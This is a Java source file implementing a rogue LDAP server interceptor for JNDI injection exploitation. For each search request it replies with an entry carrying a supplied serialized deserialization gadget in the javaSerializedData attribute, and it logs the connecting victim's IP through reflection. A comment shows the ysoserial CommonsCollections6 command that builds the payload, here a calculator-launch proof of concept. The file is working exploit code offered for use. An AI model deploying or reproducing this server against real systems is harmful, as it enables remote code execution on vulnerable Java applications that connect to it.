package org.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.SocketAddress;

public  class SerialOperationInterceptor extends InMemoryOperationInterceptor {

    private byte[] gadget;

    public SerialOperationInterceptor(byte[] gadget) {
        this.gadget = gadget;
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, e);
        } catch (Exception e1) {
            e1.printStackTrace();
        }

    }

    protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {
        //------------获取client ip-----------
        Class<?> aClass = Class.forName("com.unboundid.ldap.listener.interceptor.InterceptedOperation");
        Method getClientConnection = aClass.getDeclaredMethod("getClientConnection");
        getClientConnection.setAccessible(true);
        Object invoke = getClientConnection.invoke(result);

        Class<?> aClass2 = Class.forName("com.unboundid.ldap.listener.LDAPListenerClientConnection");
        Field socket = aClass2.getDeclaredField("socket");
        socket.setAccessible(true);
        Socket socket1 = (Socket) socket.get(invoke);

        SocketAddress remoteSocketAddress = socket1.getRemoteSocketAddress();
        //---------------------------------------

        System.out.println("收到ip: " + remoteSocketAddress.toString().substring(1) + " 的请求！");
        e.addAttribute("javaClassName", "foo");

        // java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections6 '/Applications/Calculator.app/Contents/MacOS/Calculator'|base64
        e.addAttribute("javaSerializedData", gadget);

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

}
